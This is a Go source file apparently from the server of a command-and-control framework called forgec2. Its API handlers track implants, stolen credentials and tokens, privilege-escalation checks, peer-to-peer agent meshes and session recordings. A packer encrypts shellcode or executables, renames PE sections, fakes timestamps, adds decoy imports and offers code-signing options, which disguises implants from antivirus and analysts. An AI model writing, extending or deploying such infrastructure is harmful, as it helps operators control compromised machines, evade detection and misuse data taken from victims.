package server

import (
	"encoding/base64"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleAPIPackerTemplates(c *gin.Context) {
	templates := payload.BuiltinTemplates()
	respond(c, gin.H{"templates": templates})
}

func (s *Server) handleAPIPackerInfo(c *gin.Context) {
	respond(c, gin.H{
		"encode_types": []string{"none", "xor", "aes256", "rc4"},
		"entry_points": []string{"direct", "thread", "callback"},
		"timestamps":   []string{"random", "fixed", "none"},
		"cert_options": []string{"self_signed", "none", "authenticode"},
		"output_types": []string{"exe", "dll", "ps1", "raw"},
	})
}

func (s *Server) handleAPISettings(c *gin.Context) {
	// Gather DB stats
	var totalAgents, onlineAgents int64
	if err := s.db.Model(&db.Implant{}).Count(&totalAgents).Error; err != nil {
		slog.Error("Failed to count agents", "err", err)
	}
	if err := s.db.Model(&db.Implant{}).Where("last_seen > ?", time.Now().Add(-s.offlineThreshold())).Count(&onlineAgents).Error; err != nil {
		slog.Error("Failed to count online agents", "err", err)
	}

	var totalListeners, totalCreds, totalTokens, totalAudits int64
	if err := s.db.Model(&db.Listener{}).Count(&totalListeners).Error; err != nil {
		slog.Error("Failed to count listeners", "err", err)
	}
	if err := s.db.Model(&db.CredentialEntry{}).Count(&totalCreds).Error; err != nil {
		slog.Error("Failed to count credentials", "err", err)
	}
	if err := s.db.Model(&db.TokenEntry{}).Count(&totalTokens).Error; err != nil {
		slog.Error("Failed to count tokens", "err", err)
	}
	if err := s.db.Model(&db.AuditLog{}).Count(&totalAudits).Error; err != nil {
		slog.Error("Failed to count audit logs", "err", err)
	}

	var dbSize int64
	if fi, err := os.Stat(s.cfg.Database.Path); err == nil {
		dbSize = fi.Size()
	}

	uptime := time.Since(s.startTime)
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	respond(c, gin.H{
		"success": true,
		"data": gin.H{
			"server": gin.H{
				"port":              s.cfg.Server.Port,
				"host":              s.cfg.Server.Host,
				"tls_enabled":       s.cfg.Server.TLSEnabled,
				"tcp_enabled":       s.cfg.Server.TCPEnabled,
				"tcp_addr":          s.cfg.Server.TCPAddr,
				"log_level":         s.cfg.Logging.Level,
				"offline_threshold": s.cfg.Server.OfflineThreshold,
				"session_max_age":   s.cfg.Server.SessionMaxAgeHours,
				"cleanup_retention": s.cfg.Server.CleanupRetentionDays,
				"total_agents":      totalAgents,
				"online_agents":     onlineAgents,
				"total_listeners":   totalListeners,
				"total_credentials": totalCreds,
				"total_tokens":      totalTokens,
				"total_audits":      totalAudits,
				"database_size":     dbSize,
				"database_path":     "***",
				"data_dir":          "***",
				"uptime":            uptime.String(),
				"go_version":        runtime.Version(),
				"goos":              runtime.GOOS,
				"goarch":            runtime.GOARCH,
				"goroutines":        runtime.NumGoroutine(),
				"alloc_mem":         int64(m.Alloc),
				"total_alloc_mem":   int64(m.TotalAlloc),
				"num_cpu":           runtime.NumCPU(),
			},
			"agent": gin.H{
				"default_interval": s.cfg.Implant.DefaultInterval,
				"default_jitter":   s.cfg.Implant.DefaultJitter,
				"default_skip_tls": s.cfg.Implant.DefaultSkipTLS,
				"default_ua":       s.cfg.Implant.DefaultUA,
			},
		},
	})
}

func (s *Server) handleAPIMeshTopology(c *gin.Context) {
	var peers []db.MeshPeer
	if err := s.db.Limit(500).Find(&peers).Error; err != nil {
		slog.Error("Failed to query mesh peers", "err", err)
	}
	type topoNode struct {
		ID        string `json:"id"`
		Label     string `json:"label"`
		PeerCount int    `json:"peer_count"`
		P2PMode   string `json:"p2p_mode"`
	}
	nodeMap := make(map[string]*topoNode)
	var edges [][2]string
	for _, p := range peers {
		if _, ok := nodeMap[p.AgentID]; !ok {
			nodeMap[p.AgentID] = &topoNode{ID: p.AgentID, Label: p.AgentID, P2PMode: "relay"}
		}
		if _, ok := nodeMap[p.PeerID]; !ok {
			nodeMap[p.PeerID] = &topoNode{ID: p.PeerID, Label: p.PeerID, P2PMode: "relay"}
		}
		edges = append(edges, [2]string{p.AgentID, p.PeerID})
	}
	nodes := make([]topoNode, 0, len(nodeMap))
	for _, n := range nodeMap {
		nodes = append(nodes, *n)
	}
	type topoEdge struct {
		From string `json:"from"`
		To   string `json:"to"`
	}
	edgeList := make([]topoEdge, 0, len(edges))
	for _, e := range edges {
		edgeList = append(edgeList, topoEdge{From: e[0], To: e[1]})
	}
	respond(c, gin.H{"success": true, "nodes": nodes, "edges": edgeList})
}

func (s *Server) handleAPITranslationsStats(c *gin.Context) {
	stats := GetTranslationStats()
	missing := make(map[string][]string)
	for lang := range SupportedLanguages {
		missing[lang] = GetMissingTranslations(lang)
	}
	allKeys := GetAllTranslationKeys()
	respond(c, gin.H{
		"stats":      stats,
		"total_keys": len(allKeys),
		"missing":    missing,
	})
}

func (s *Server) handleAPIPrivesc(c *gin.Context) {
	type privescResult struct {
		ID        uint      `json:"id"`
		AgentID   string    `json:"agent_id"`
		Command   string    `json:"command"`
		Result    string    `json:"result"`
		Status    string    `json:"status"`
		CreatedAt time.Time `json:"created_at"`
	}
	var results []privescResult
	s.db.Table("tasks").
		Select("id, agent_id, command, result, status, created_at").
		Where("type = ?", "privesc_check").
		Order("created_at DESC").
		Limit(100).
		Find(&results)
	respond(c, gin.H{"results": results})
}

func (s *Server) handleAPITimelineData(c *gin.Context) {
	type timelineEntry struct {
		ID        uint      `json:"id"`
		Timestamp time.Time `json:"timestamp"`
		Type      string    `json:"type"`
		User      string    `json:"user"`
		Action    string    `json:"action"`
		Details   string    `json:"details"`
		AgentID   string    `json:"agent_id"`
		IP        string    `json:"ip"`
		Success   bool      `json:"success"`
	}

	events := make([]timelineEntry, 0)

	// Audit logs
	var auditLogs []struct {
		ID        uint
		CreatedAt time.Time
		User      string
		Action    string
		Details   string
		AgentID   string
		IP        string
		Success   bool
	}
	if err := s.db.Table("audit_logs").
		Select("id, created_at, user, action, details, agent_id, ip, success").
		Order("created_at DESC").Limit(200).Find(&auditLogs).Error; err != nil {
		slog.Error("Failed to query audit logs for timeline", "err", err)
	}
	for _, l := range auditLogs {
		events = append(events, timelineEntry{
			ID: l.ID, Timestamp: l.CreatedAt, Type: "audit",
			User: l.User, Action: l.Action, Details: l.Details,
			AgentID: l.AgentID, IP: l.IP, Success: l.Success,
		})
	}

	// Recent tasks
	var tasks []struct {
		ID        uint
		CreatedAt time.Time
		AgentID   string
		Type      string
		Command   string
		Status    string
	}
	if err := s.db.Table("tasks").
		Select("id, created_at, agent_id, type, command, status").
		Order("created_at DESC").Limit(200).Find(&tasks).Error; err != nil {
		slog.Error("Failed to query tasks for timeline", "err", err)
	}
	for _, t := range tasks {
		events = append(events, timelineEntry{
			ID: t.ID, Timestamp: t.CreatedAt, Type: "task",
			Action:  fmt.Sprintf("[%s] %s %s", t.Status, t.Type, t.Command),
			AgentID: t.AgentID, Success: t.Status == "completed",
		})
	}

	respond(c, gin.H{"events": events, "total": len(events)})
}

func (s *Server) handleAPIChatHistory(c *gin.Context) {
	channel := c.DefaultQuery("channel", "general")
	var msgs []db.ChatMessage
	if err := s.db.Where("channel = ?", channel).Order("created_at asc").Limit(200).Find(&msgs).Error; err != nil {
		slog.Error("Failed to query chat history", "err", err)
	}
	respond(c, gin.H{"messages": msgs})
}

func (s *Server) handleAPIChatChannels(c *gin.Context) {
	type channelRow struct {
		Channel      string `gorm:"column:channel"`
		MessageCount int    `gorm:"column:message_count"`
		LastMessage  string `gorm:"column:last_message"`
		LastTime     string `gorm:"column:last_time"`
	}
	var rows []channelRow
	if err := s.db.Model(&db.ChatMessage{}).
		Select("channel, COUNT(*) as message_count, MAX(message) as last_message, MAX(created_at) as last_time").
		Group("channel").Order("MAX(created_at) DESC").Limit(500).Find(&rows).Error; err != nil {
		slog.Error("Failed to query chat channels", "err", err)
	}
	respond(c, gin.H{"channels": rows})
}

func (s *Server) buildChainEntries() []gin.H {
	var agents []db.Implant
	if err := s.db.Select("id, hostname, parent_agent_id").Order("last_seen desc").Limit(5000).Find(&agents).Error; err != nil {
		slog.Error("Failed to build chain entries", "err", err)
	}
	entries := make([]gin.H, 0, len(agents))
	for _, a := range agents {
		entries = append(entries, gin.H{
			"id":        a.ID,
			"hostname":  a.Hostname,
			"parent_id": a.ParentAgentID,
		})
	}
	return entries
}

func (s *Server) handleAPIChainGraph(c *gin.Context) {
	respond(c, gin.H{"nodes": s.buildChainEntries()})
}

func (s *Server) handleAPIChainList(c *gin.Context) {
	respond(c, gin.H{"chains": s.buildChainEntries()})
}

func (s *Server) handleAPISendChatMessage(c *gin.Context) {
	var req struct {
		Message string `json:"message"`
		Channel string `json:"channel"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.Message == "" {
		respondError(c, http.StatusBadRequest, "message is required")
		return
	}
	if req.Channel == "" {
		req.Channel = "general"
	}
	msg := db.ChatMessage{
		Username:  s.currentUsername(c),
		Message:   req.Message,
		Channel:   req.Channel,
		CreatedAt: time.Now(),
	}
	if err := s.db.Create(&msg).Error; err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Chat message"))
		return
	}
	respond(c, gin.H{"success": true, "id": msg.ID})
}

func (s *Server) handleDownloadBuild(c *gin.Context) {
	id := c.Param("id")
	var logEntry db.BuildLog
	if err := s.db.First(&logEntry, "id = ?", id).Error; err != nil {
		respondError(c, http.StatusNotFound, "build not found")
		return
	}
	if logEntry.OutputPath == "" {
		respondError(c, http.StatusNotFound, "no artifact available")
		return
	}
	if _, err := os.Stat(logEntry.OutputPath); os.IsNotExist(err) {
		respondError(c, http.StatusNotFound, "artifact file not found on disk")
		return
	}
	allowedDir := filepath.Join(s.implantDataDir())
	cleanPath := filepath.Clean(logEntry.OutputPath)
	if !strings.HasPrefix(cleanPath, filepath.Clean(allowedDir)) {
		respondError(c, http.StatusForbidden, "Access denied")
		return
	}
	serveFileSafe(c, logEntry.OutputPath, allowedDir, logEntry.Filename)
}

func (s *Server) handleConfigReload(c *gin.Context) {
	if s.configReloader == nil {
		respondError(c, http.StatusServiceUnavailable, "config reloader not initialized")
		return
	}

	if err := s.configReloader.Reload(); err != nil {
		slog.Error("Config reload failed", "err", err)
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Config reload"))
		return
	}

	s.LogAuditRecord(c, "config_reload", "system", "", "Configuration reloaded from disk", true, nil)
	respond(c, gin.H{"success": true, "message": "configuration reloaded"})
}

func (s *Server) handlePackerArtifact(c *gin.Context) {
	var req payload.BuildArtifactRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		respondErrorSafe(c, http.StatusBadRequest, err, "invalid request")
		return
	}

	if req.ShellcodeB64 == "" && req.RawEXEB64 == "" {
		respondError(c, http.StatusBadRequest, "either shellcode_b64 or raw_exe_b64 is required")
		return
	}

	dataDir := s.cfg.Server.DataDir
	if !filepath.IsAbs(dataDir) {
		if abs, err := filepath.Abs(dataDir); err == nil {
			dataDir = abs
		}
	}

	artifact, filename, err := payload.BuildArtifact(req, dataDir)
	if err != nil {
		slog.Error("Packer artifact build failed", "err", err)
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Build"))
		return
	}

	s.LogAuditRecord(c, "packer_build_artifact", "packer", "", fmt.Sprintf("Built %s artifact (%d bytes)", filename, len(artifact)), true, nil)
	c.JSON(http.StatusOK, gin.H{
		"data":     base64.StdEncoding.EncodeToString(artifact),
		"filename": filename,
		"size":     len(artifact),
	})
}

// ── Settings Maintenance Purge ────────────────────────────────────────

func (s *Server) handleSettingsMaintenancePurge(c *gin.Context) {
	retentionDays := s.cfg.Server.CleanupRetentionDays
	if retentionDays <= 0 {
		retentionDays = 90
	}
	cutoff := time.Now().AddDate(0, 0, -retentionDays)

	type purgeResult struct {
		Table string `json:"table"`
		Count int64  `json:"count"`
	}
	var results []purgeResult

	tables := []struct {
		name string
		col  string
	}{
		{"audit_logs", "created_at"},
		{"build_logs", "created_at"},
		{"tasks", "created_at"},
		{"chat_messages", "created_at"},
		{"session_recordings", "timestamp"},
		{"circuit_breaker_events", "created_at"},
		{"opsec_history", "created_at"},
	}
	for _, t := range tables {
		var count int64
		if err := s.db.Table(t.name).Where(t.col+" < ?", cutoff).Count(&count).Error; err != nil {
			slog.Error("Failed to count purgeable records", "table", t.name, "err", err)
		}
		if count > 0 {
			s.db.Table(t.name).Where(t.col+" < ?", cutoff).Delete(nil)
			results = append(results, purgeResult{Table: t.name, Count: count})
		}
	}

	s.LogAuditRecord(c, "maintenance_purge", "system", "", fmt.Sprintf("Purged data older than %d days", retentionDays), true, nil)
	respond(c, gin.H{"success": true, "retention_days": retentionDays, "purged": results})
}

// ── Agent Chain ──────────────────────────────────────────────────────

func (s *Server) handleAgentChainGet(c *gin.Context) {
	respond(c, gin.H{"chain": s.buildChainEntries()})
}

func (s *Server) handleAgentChainSet(c *gin.Context) {
	var req struct {
		AgentID  string `json:"agent_id"`
		ParentID string `json:"parent_id"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.AgentID == "" {
		respondError(c, http.StatusBadRequest, "agent_id is required")
		return
	}
	if req.AgentID == req.ParentID {
		respondError(c, http.StatusBadRequest, "agent cannot be its own parent")
		return
	}
	if err := s.db.Model(&db.Implant{}).Where("id = ?", req.AgentID).Update("parent_agent_id", req.ParentID).Error; err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Update agent chain"))
		return
	}
	s.LogAuditRecord(c, "agent_chain_set", "agents", req.AgentID, fmt.Sprintf("Parent set to %s", req.ParentID), true, nil)
	respond(c, gin.H{"success": true})
}

func (s *Server) handleAgentChainClear(c *gin.Context) {
	var req struct {
		AgentID string `json:"agent_id"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.AgentID == "" {
		respondError(c, http.StatusBadRequest, "agent_id is required")
		return
	}
	if err := s.db.Model(&db.Implant{}).Where("id = ?", req.AgentID).Update("parent_agent_id", "").Error; err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Clear agent chain"))
		return
	}
	s.LogAuditRecord(c, "agent_chain_clear", "agents", req.AgentID, "Chain cleared", true, nil)
	respond(c, gin.H{"success": true})
}

// ── Agent Recording ──────────────────────────────────────────────────

func (s *Server) handleAgentRecordingGet(c *gin.Context) {
	agentID := c.Query("agent_id")
	var recordings []db.SessionRecording
	q := s.db.Order("timestamp DESC").Limit(100)
	if agentID != "" {
		q = q.Where("agent_id = ?", agentID)
	}
	if err := q.Find(&recordings).Error; err != nil {
		slog.Error("Failed to query agent recordings", "err", err)
	}
	respond(c, gin.H{"recordings": recordings})
}

func (s *Server) handleAgentRecordingReplay(c *gin.Context) {
	id := c.Param("id")
	if id == "" {
		respondError(c, http.StatusBadRequest, "recording id is required")
		return
	}
	var rec db.SessionRecording
	if err := s.db.First(&rec, "id = ?", id).Error; err != nil {
		respondError(c, http.StatusNotFound, "recording not found")
		return
	}
	respond(c, gin.H{"recording": rec})
}

// ── Mesh Route ───────────────────────────────────────────────────────

func (s *Server) handleMeshRoute(c *gin.Context) {
	agentID := c.Query("agent_id")
	if agentID == "" {
		respondError(c, http.StatusBadRequest, "agent_id is required")
		return
	}
	var peers []db.MeshPeer
	if err := s.db.Where("agent_id = ? OR peer_id = ?", agentID, agentID).Limit(500).Find(&peers).Error; err != nil {
		slog.Error("Failed to query mesh route", "err", err)
	}
	respond(c, gin.H{"success": true, "peers": peers})
}

func (s *Server) handlePackerBundle(c *gin.Context) {
	var req struct {
		AgentEXEB64    string `json:"agent_exe"`
		EncodeType     string `json:"encode_type"`
		PESectionText  string `json:"pe_section_text"`
		PESectionData  string `json:"pe_section_data"`
		PESectionRdata string `json:"pe_section_rdata"`
		PESectionReloc string `json:"pe_section_reloc"`
		EntryPoint     string `json:"entry_point"`
		Timestamp      string `json:"timestamp"`
		TimestampDate  string `json:"timestamp_date"`
		CertOption     string `json:"cert_option"`
		ImportDLLs     string `json:"import_dlls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondErrorSafe(c, http.StatusBadRequest, err, "invalid request")
		return
	}

	if req.AgentEXEB64 == "" {
		respondError(c, http.StatusBadRequest, "agent_exe is required")
		return
	}

	artifact, err := base64.StdEncoding.DecodeString(req.AgentEXEB64)
	if err != nil {
		respondErrorSafe(c, http.StatusBadRequest, err, "invalid agent_exe base64")
		return
	}

	sections := payload.PESectionConfig{}
	if req.PESectionText != "" {
		sections.Text = req.PESectionText
	}
	if req.PESectionData != "" {
		sections.Data = req.PESectionData
	}
	if req.PESectionRdata != "" {
		sections.Rdata = req.PESectionRdata
	}
	if req.PESectionReloc != "" {
		sections.Reloc = req.PESectionReloc
	}

	if sections != (payload.PESectionConfig{}) {
		payload.ApplyPESectionNames(artifact, sections)
	}

	tsOpt := payload.TimestampOption(req.Timestamp)
	if tsOpt == "" {
		tsOpt = "random"
	}
	ts, _ := payload.GenerateTimestamp(tsOpt, req.TimestampDate)
	payload.ApplyTimestamp(artifact, ts)

	if req.ImportDLLs != "" {
		dlls := strings.Split(req.ImportDLLs, ",")
		for i := range dlls {
			dlls[i] = strings.TrimSpace(dlls[i])
		}
		payload.AddBenignImports(artifact, dlls)
	}

	s.LogAuditRecord(c, "packer_bundle", "packer", "", fmt.Sprintf("Bundled payload (%d bytes)", len(artifact)), true, nil)
	c.JSON(http.StatusOK, gin.H{
		"data": base64.StdEncoding.EncodeToString(artifact),
		"size": len(artifact),
	})
}
